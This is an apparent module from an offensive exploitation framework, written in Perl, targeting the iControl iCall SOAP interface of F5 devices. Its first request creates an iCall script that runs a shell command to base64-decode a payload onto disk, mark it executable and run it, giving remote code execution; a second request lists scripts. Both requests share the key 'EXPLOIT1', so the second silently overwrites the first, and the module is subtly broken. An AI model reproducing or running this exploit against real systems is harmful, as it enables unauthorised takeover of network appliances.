ExploitsMSF/F5/MSF/F5_icallCmd.pm

package P1rK3r::Exploits::F5::MSF::F5_icallCmd;
use parent qw(P1rK3r::Exploit P1rK3r::Services::F5);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "F5_icallCmd";

   my $DETECTION = {

   };

   my $EXPLOIT = {
        TYPE => 'MSF',
        PLATFORM => 'ALL',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => '',
                        PAYLOAD      => '<?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:scr="urn:iControl:iCall/Script" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding" xmlns:per="urn:iControl:iCall/PeriodicHandler">
  <soapenv:Header/>
  <soapenv:Body>
    <scr:create soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
      <scripts xmlns:urn="urn:iControl" xsi:type="urn:Common.StringSequence" soapenc:arrayType="xsd:string[]">
        <item>script-vs2X2C2Majo4ZDan</item>
      </scripts>
      <definitions xmlns:urn="urn:iControl" xsi:type="urn:Common.StringSequence" soapenc:arrayType="xsd:string[]">
        <item>exec /bin/sh -c "echo X19QQVlMT0FEX18=|base64 --decode &gt;/ALL/F5/F5_icallCmd/__FILENAME__; chmod +x /ALL/F5/F5_icallCmd/__FILENAME__;/ALL/F5/F5_icallCmd/__FILENAME__"</item>
      </definitions>
    </scr:create>
  </soapenv:Body>
</soapenv:Envelope>
',
                        TEXT         => 'Sending Exploit #1 Request : [POST] /',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => '',
                        PAYLOAD      => '<?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:scr="urn:iControl:iCall/Script" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding" xmlns:per="urn:iControl:iCall/PeriodicHandler">
  <soapenv:Header/>
  <soapenv:Body>
    <scr:get_list soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
  </soapenv:Body>
</soapenv:Envelope>
',
                        TEXT         => 'Sending Exploit #1 Request : [POST] /',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
